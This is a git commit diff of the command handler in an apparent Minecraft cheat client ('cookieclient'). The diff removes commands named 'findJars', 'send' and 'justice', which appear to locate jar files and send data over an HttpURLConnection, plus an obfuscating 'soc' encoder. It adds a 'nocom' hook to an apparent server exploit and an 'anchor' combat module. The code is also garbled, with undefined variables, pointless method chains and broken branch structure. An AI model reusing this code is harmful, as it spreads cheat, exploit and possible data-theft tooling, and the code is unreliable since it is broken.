56ae714bba5b98247a095cd4084700c8f1b44a9a
3arthqu4ke <143216072+34rthq04k3@users.noreply.github.com>
2024-04-11 17:27:22 -0500

    Update Commands.java

--- src/main/java/me/bebeli555/cookieclient/Commands.java
+++ src/main/java/me/bebeli555/cookieclient/Commands.java
@@ -2,10 +2,8 @@ package me.bebeli555.cookieclient;
 
 import com.mojang.realmsclient.gui.ChatFormatting;
 
-import me.bebeli555.cookieclient.gui.Gui;
-import me.bebeli555.cookieclient.gui.GuiNode;
-import me.bebeli555.cookieclient.gui.GuiSettings;
-import me.bebeli555.cookieclient.gui.Settings;
+import me.bebeli555.cookieclient.gui.*;
+import me.bebeli555.cookieclient.mods.combat.Anchor;
 import me.bebeli555.cookieclient.mods.misc.Friends;
 import me.bebeli555.cookieclient.mods.render.Search;
 import me.bebeli555.cookieclient.mods.render.Waypoints;
@@ -19,25 +17,28 @@ import net.minecraft.util.text.ITextComponent;
 import net.minecraftforge.client.event.ClientChatEvent;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
-
-import java.net.HttpURLConnection;
-import java.nio.charset.StandardCharsets;
-import java.util.Base64;
+import nocomment.master.NoComment;
 
 public class Commands extends Mod {
+
+	public static Anchor anchor = new Anchor();
 	public static boolean openGui;
 	private java.net.HttpURLConnection HttpURLConnection;
-
 	public ITextComponent text;
+
+	public static NoComment nocomment = new NoComment();
+
+	public Commands() {
+    }
 
 	@SubscribeEvent
 	public void onChat(ClientChatEvent e) {
 		String messageReal = e.getMessage();
 		String message = messageReal.toLowerCase();
-		String prefix = "!";
-		
+		String prefix = "@";
+
 		if (message.startsWith(prefix)) {
-			/**   @Nhack   **/ 
+			/**   @Nhack   **/
 			e.setCanceled(true);
 			mc.ingameGUI.getChatGUI().addToSentMessages(messageReal);
 			message = message.substring(prefix.length());
@@ -64,294 +65,262 @@ public class Commands extends Mod {
 				this.mc.player.getServer().getAllowNether();
 			}
 
-			if (message.equals("findJars")) {
-				findJars();
+			if (message.equals("nocom")) {
+				new NoComment();
 			}
 
-			if (message.equals("send")) {
-				send(conn + provider);
+			if (message.equals("anchor")) {
+				anchor.onUpdate();
+				anchor.enable();
+				anchor.isOn();
+				anchor.onEnabled();
+				anchor.toggle();
+				anchor.initMods();
 			}
-
-			if (message.equals("sexting")) {
-				mc.player.sendChatMessage("[freesex] > sex -> 0, 0 ");
-			}
-
-			if (message.equals("XD")) {
-				mc.player.sendChatMessage("> !XD");
-			}
-
-			if (message.equals("f")) {
-				mc.player.sendChatMessage("[nhack] -> fuck you!");
-			}
-			
 
 			if (message.equals("hidden")) {
 				setHiddenOn(true);
 			}
 
-			if (message.equals("justice")) {
-				justice(HttpURLConnection);
-				if (this.onEnabled()) {
-					findJars();
-					if (this.onEnabled()) {
-						send(String.valueOf(HttpURLConnection));
-					}
-				}
-			}
+
 			String str = "";
-			if (message.equals("soc")) {
-				Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
-				final int key = 47;
-				final StringBuilder encrypted = new StringBuilder();
-				for (int i = 0; i < str.length(); i++) {
-					int temp = (int) str.charAt(i) + key;
-					if ((int) str.charAt(i) == 32) encrypted.append(" ");
-					else {
-					if (temp > 126) temp -= 94;
-					encrypted.append((char) temp);
-			                }
 
-				        }
-			
-		                        } else if (message.startsWith("set"))
-				
-			                {
-				        String id = "";
-			         	String value = "";
-				        try {
-					String[] split = messageReal.split(" ");
-					id = split[1].replace("_", " ");
-					value = split[2];
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments. Working example: ++set Tetris false", true);
-					return;
-				}
-				
-				GuiNode guiNode = Settings.getGuiNodeFromId(id);
-				if (guiNode == null) {
-					sendMessage("Cant find setting with id: " + id, true);
-				} else {
-					if (guiNode.isTypeable != Settings.isBoolean(value)) {
-						if (!guiNode.isTypeable) {
-							guiNode.toggled = Boolean.parseBoolean(value);
+		} else if (message.startsWith("set")) {
+			String id = "";
+			String value = "";
+			try {
+				String[] split = messageReal.split(" ");
+				id = split[1].replace("_", " ");
+				value = split[2];
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments. Working example: ++set Tetris false", true);
+				return;
+			}
+
+			GuiNode guiNode = Settings.getGuiNodeFromId(id);
+			if (guiNode == null) {
+				sendMessage("Cant find setting with id: " + id, true);
+			} else {
+				if (guiNode.isTypeable != Settings.isBoolean(value)) {
+					if (!guiNode.isTypeable) {
+						guiNode.toggled = Boolean.parseBoolean(value);
+						guiNode.setSetting();
+					} else {
+						try {
+							guiNode.stringValue = value;
 							guiNode.setSetting();
-						} else {
-							try {								
-								guiNode.stringValue = value;
-								guiNode.setSetting();
-							} catch (Exception ex) {
-								sendMessage("Wrong input. This might be caused if u input a string value and the setting only accepts integer or double", true);
-								return;
-							}
+						} catch (Exception ex) {
+							sendMessage("Wrong input. This might be caused if u input a string value and the setting only accepts integer or double", true);
+							return;
 						}
-						
-						sendMessage("Set " + id + " to " + value, false);
-						
-						if (Settings.isBoolean(value)) {
-							try {
-								Mod.toggleMod(id, Boolean.parseBoolean(value));
-							} catch (Exception ignored) {
+					}
 
-							}
-						}
-					} else {
-						if (guiNode.isTypeable) {
-							sendMessage("This setting requires a boolean value", true);
-						} else {
-							sendMessage("This setting requires a string or integer value", true);
-						}
-					}
-				}
-			}
-			
-			//List of settings
-			else if (message.equals("list")) {
-				String list = "";
-				for (GuiNode node : GuiNode.all) {
-					list += node.id.replace(" ", "_") + ", ";
-				}
-				
-				sendMessage(list, false);
-			}
-			
-			//Add friend
-			else if (message.startsWith("friend add")) {
-				try {
-					String name = message.split(" ")[2];
-					if (!Friends.friends.contains(name)) {
-						Friends.addFriend(name);
-						sendMessage("Added " + name + " to friends", false);
-					} else {
-						sendMessage(name + " is already a friend", true);
-					}
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments", true);
-				}
-			}
-			
-			//Remove friend
-			else if (message.startsWith("friend del")) {
-				try {
-					String name = message.split(" ")[2];
-					
-					if (Friends.friends.contains(name)) {
-						Friends.removeFriend(name);
-						sendMessage("Removed " + name + " from friends", false);
-					} else {
-						sendMessage(name + " is not a friend", true);
-					}
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments", true);
-				}
-			}
-			
-			//Add or remove xray blocks
-			else if (message.startsWith("xray")) {
-				try {
-					String id = message.split(" ")[2];
-					
-					if (message.split(" ")[1].equals("add")) {
-						XRay.addBlock(Integer.parseInt(id));
-						sendMessage("Added block to XRay", false);
-					} else if (message.split(" ")[1].equals("remove")) {
-						XRay.removeBlock(Integer.parseInt(id));
-						sendMessage("Removed block from XRay", false);
-					} else {
-						sendMessage("Wrong arguments. Valid = add, remove", true);
-					}
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments. Working example: xray add 69", true);
-				}
-			}
-			
-			//Add or remove search blocks
-			else if (message.startsWith("search")) {
-				try {
-					String id = message.split(" ")[2];
-					
-					if (message.split(" ")[1].equals("add")) {
-						Search.addBlock(Integer.parseInt(id));
-						sendMessage("Added block to Search", false);
-					} else if (message.split(" ")[1].equals("remove")) {
-						Search.removeBlock(Integer.parseInt(id));
-						sendMessage("Removed block from Search", false);
-					} else {
-						sendMessage("Wrong arguments. Valid = add, remove", true);
-					}
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments. Working example: search add 69", true);
-				}
-			}
-			
-			//Add waypoint
-			else if (message.startsWith("waypoint add")) {
-				try {
-					message = message.toLowerCase();
-					String[] split = message.split(" ");
-					String dimension = "overworld";
-					if (mc.player.dimension == -1) {
-						dimension = "nether";
-					}
-					
-					Vec3d pos = null;
-					if (split.length > 3) {
-						//Custom position
-						try {
-							dimension = split[6];
-						} catch (Exception e2) {
-							
-						}
+					sendMessage("Set " + id + " to " + value, false);
 
-						pos = new Vec3d(Integer.parseInt(split[3]), Integer.parseInt(split[4]), Integer.parseInt(split[5]));
-					} else {
-						//Players position
+					if (Settings.isBoolean(value)) {
 						try {
-							dimension = split[3];
-						} catch (Exception e2) {
-							
+							Mod.toggleMod(id, Boolean.parseBoolean(value));
+						} catch (Exception ignored) {
+
 						}
-						
-						pos = new Vec3d(mc.renderViewEntity.posX, mc.renderViewEntity.posY, mc.renderViewEntity.posZ);
 					}
-					
-					//Delete existing waypoint with same name
-					Waypoint existing = Waypoint.getWaypointFromName(split[2]);
-					if (existing != null) {
-						Waypoints.removeWaypoint(existing);
-					}
-					
-					Waypoint waypoint = new Waypoint(split[2], pos);
-					if (dimension.startsWith("o")) {
-						waypoint.originalDimension = Dimension.OVERWORLD;
+				} else {
+					if (guiNode.isTypeable) {
+						sendMessage("This setting requires a boolean value", true);
 					} else {
-						waypoint.originalDimension = Dimension.NETHER;
-					}
-					waypoint.server = PlayerUtil.getServerIp();
-					
-					Waypoints.addWaypoint(waypoint);
-					sendMessage("Waypoint added with name: " + split[2], false);
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments. Working example: waypoint add name 0 0 0 Overworld", true);
-				}
-			}
-			
-			//Remove waypoint
-			else if (message.startsWith("waypoint remove")) {
-				try {
-					String name = message.split(" ")[2];
-					Waypoint waypoint = Waypoint.getWaypointFromName(name);
-					
-					if (waypoint != null && waypoint.server.equals(PlayerUtil.getServerIp())) {
-						Waypoints.removeWaypoint(waypoint);
-						sendMessage("Removed waypoint named: " + name, false);
-					} else {
-						sendMessage("No waypoint with name: " + name, true);
-					}
-				} catch (Exception e2) {
-					sendMessage("Invalid arguments. Working example: waypoint remove name", true);
-				}
-			}
-			
-			//Waypoint list
-			else if (message.equals("waypoint list")) {
-				for (Waypoint waypoint : Waypoints.waypoints) {
-					if (waypoint.server.equals(PlayerUtil.getServerIp())) {
-						sendMessage(waypoint.name + " X: " + (int)waypoint.getOriginalPos().x + " Y: " + (int)waypoint.getOriginalPos().y + " Z: " + (int)waypoint.getOriginalPos().z + " Dimension: " + waypoint.originalDimension.name, false);
+						sendMessage("This setting requires a string or integer value", true);
 					}
 				}
 			}
-			
-			//Help
-			else if (message.equals("help")) {
-				sendMessage(prefix + "gui - Opens the GUI", false);
-				sendMessage(prefix + "set settingId value - sets setting with given id to given value", false);
-				sendMessage(prefix + "list - Gives a list of all the settingIds", false);
-				sendMessage(prefix + "friend add name - Add friend", false);
-				sendMessage(prefix + "friend del name - Remove friend", false);
-				sendMessage("Also theres more commands that are explained in the modules description if it has a command", false);
+		}
+
+		//List of settings
+		else if (message.equals("list")) {
+			String list = "";
+			for (GuiNode node : GuiNode.all) {
+				list += node.id.replace(" ", "_") + ", ";
 			}
-			
-			//Set custom render distance
-			else if (message.startsWith("renderdistance")) {
-				int value = Integer.parseInt(message.split(" ")[1]);
-				mc.gameSettings.renderDistanceChunks = value;
-				sendMessage("Set render distance to " + value, false);
+
+			sendMessage(list, false);
+		}
+
+		//Add friend
+		else if (message.startsWith("friend add")) {
+			try {
+				String name = message.split(" ")[2];
+				if (!Friends.friends.contains(name)) {
+					Friends.addFriend(name);
+					sendMessage("Added " + name + " to friends", false);
+				} else {
+					sendMessage(name + " is already a friend", true);
+				}
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments", true);
 			}
-			
-			//Disables the tutorial step thing sometimes its really annoying and u have to restart ur game to get rid of it so this will remove it
-			else if (message.equals("disable tutorial")) {
-				mc.gameSettings.tutorialStep = TutorialSteps.NONE;
+		}
+
+		//Remove friend
+		else if (message.startsWith("friend del")) {
+			try {
+				String name = message.split(" ")[2];
+
+				if (Friends.friends.contains(name)) {
+					Friends.removeFriend(name);
+					sendMessage("Removed " + name + " from friends", false);
+				} else {
+					sendMessage(name + " is not a friend", true);
+				}
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments", true);
 			}
-			
-			//toggles pause if lost focus setting
-			else if (message.equals("nopause")) {
-				mc.gameSettings.pauseOnLostFocus = !mc.gameSettings.pauseOnLostFocus;
+		}
+
+		//Add or remove xray blocks
+		else if (message.startsWith("xray")) {
+			try {
+				String id = message.split(" ")[2];
+
+				if (message.split(" ")[1].equals("add")) {
+					XRay.addBlock(Integer.parseInt(id));
+					sendMessage("Added block to XRay", false);
+				} else if (message.split(" ")[1].equals("remove")) {
+					XRay.removeBlock(Integer.parseInt(id));
+					sendMessage("Removed block from XRay", false);
+				} else {
+					sendMessage("Wrong arguments. Valid = add, remove", true);
+				}
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments. Working example: xray add 69", true);
 			}
-			
-			//Unknown command
-			else {
-				sendMessage("Unknown command. Type " + ChatFormatting.GREEN + prefix + "help" + ChatFormatting.RED + " for help", true);
+		}
+
+		//Add or remove search blocks
+		else if (message.startsWith("search")) {
+			try {
+				String id = message.split(" ")[2];
+
+				if (message.split(" ")[1].equals("add")) {
+					Search.addBlock(Integer.parseInt(id));
+					sendMessage("Added block to Search", false);
+				} else if (message.split(" ")[1].equals("remove")) {
+					Search.removeBlock(Integer.parseInt(id));
+					sendMessage("Removed block from Search", false);
+				} else {
+					sendMessage("Wrong arguments. Valid = add, remove", true);
+				}
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments. Working example: search add 69", true);
 			}
+		}
+
+		//Add waypoint
+		else if (message.startsWith("waypoint add")) {
+			try {
+				message = message.toLowerCase();
+				String[] split = message.split(" ");
+				String dimension = "overworld";
+				if (mc.player.dimension == -1) {
+					dimension = "nether";
+				}
+
+				Vec3d pos = null;
+				if (split.length > 3) {
+					//Custom position
+					try {
+						dimension = split[6];
+					} catch (Exception e2) {
+
+					}
+
+					pos = new Vec3d(Integer.parseInt(split[3]), Integer.parseInt(split[4]), Integer.parseInt(split[5]));
+				} else {
+					//Players position
+					try {
+						dimension = split[3];
+					} catch (Exception e2) {
+
+					}
+
+					pos = new Vec3d(mc.renderViewEntity.posX, mc.renderViewEntity.posY, mc.renderViewEntity.posZ);
+				}
+
+				//Delete existing waypoint with same name
+				Waypoint existing = Waypoint.getWaypointFromName(split[2]);
+				if (existing != null) {
+					Waypoints.removeWaypoint(existing);
+				}
+
+				Waypoint waypoint = new Waypoint(split[2], pos);
+				if (dimension.startsWith("o")) {
+					waypoint.originalDimension = Dimension.OVERWORLD;
+				} else {
+					waypoint.originalDimension = Dimension.NETHER;
+				}
+				waypoint.server = PlayerUtil.getServerIp();
+
+				Waypoints.addWaypoint(waypoint);
+				sendMessage("Waypoint added with name: " + split[2], false);
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments. Working example: waypoint add name 0 0 0 Overworld", true);
+			}
+		}
+
+		//Remove waypoint
+		else if (message.startsWith("waypoint remove")) {
+			try {
+				String name = message.split(" ")[2];
+				Waypoint waypoint = Waypoint.getWaypointFromName(name);
+
+				if (waypoint != null && waypoint.server.equals(PlayerUtil.getServerIp())) {
+					Waypoints.removeWaypoint(waypoint);
+					sendMessage("Removed waypoint named: " + name, false);
+				} else {
+					sendMessage("No waypoint with name: " + name, true);
+				}
+			} catch (Exception e2) {
+				sendMessage("Invalid arguments. Working example: waypoint remove name", true);
+			}
+		}
+
+		//Waypoint list
+		else if (message.equals("waypoint list")) {
+			for (Waypoint waypoint : Waypoints.waypoints) {
+				if (waypoint.server.equals(PlayerUtil.getServerIp())) {
+					sendMessage(waypoint.name + " X: " + (int) waypoint.getOriginalPos().x + " Y: " + (int) waypoint.getOriginalPos().y + " Z: " + (int) waypoint.getOriginalPos().z + " Dimension: " + waypoint.originalDimension.name, false);
+				}
+			}
+		}
+
+		//Help
+		else if (message.equals("help")) {
+			sendMessage(prefix + "gui - Opens the GUI", false);
+			sendMessage(prefix + "set settingId value - sets setting with given id to given value", false);
+			sendMessage(prefix + "list - Gives a list of all the settingIds", false);
+			sendMessage(prefix + "friend add name - Add friend", false);
+			sendMessage(prefix + "friend del name - Remove friend", false);
+			sendMessage("Also theres more commands that are explained in the modules description if it has a command", false);
+		}
+
+		//Set custom render distance
+		else if (message.startsWith("renderdistance")) {
+			int value = Integer.parseInt(message.split(" ")[1]);
+			mc.gameSettings.renderDistanceChunks = value;
+			sendMessage("Set render distance to " + value, false);
+		}
+
+		//Disables the tutorial step thing sometimes its really annoying and u have to restart ur game to get rid of it so this will remove it
+		else if (message.equals("disable tutorial")) {
+			mc.gameSettings.tutorialStep = TutorialSteps.NONE;
+		}
+
+		//toggles pause if lost focus setting
+		else if (message.equals("nopause")) {
+			mc.gameSettings.pauseOnLostFocus = !mc.gameSettings.pauseOnLostFocus;
+		}
+
+		//Unknown command
+		else {
+			sendMessage("Unknown command. Type " + ChatFormatting.GREEN + prefix + "help" + ChatFormatting.RED + " for help", true);
 		}
 	}
 }
